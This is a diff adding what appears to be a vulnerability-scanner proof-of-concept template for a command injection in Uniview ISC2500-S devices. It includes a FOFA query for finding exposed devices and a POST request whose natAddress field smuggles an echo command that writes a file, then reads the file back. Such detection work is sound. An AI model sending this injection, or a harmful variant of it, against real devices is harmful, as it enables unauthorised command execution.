@@ -1,0 +1,22 @@
+id: poc-yaml-uniview-isc-setnatconfig-command-injection
+info:
+  name: 浙江宇视科技ISC setNatConfig 命令注入漏洞
+  severity: critical
+  tags:
+  - 命令注入
+  finger: isc2500-s
+  fofa: title=="ISC2500-S"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /Interface/DevManage/VM.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: cmd=setNatConfig&natAddress=%26echo%20{{.t2}}%20>{{.t1}}.txt
+  expression: status_code == 200 && contains(body,"\"success\":false")
+- method: GET
+  path: /Interface/DevManage/{{.t1}}.txt
+  expression: status_code == 200 && trim(body) == t2
+transport: http
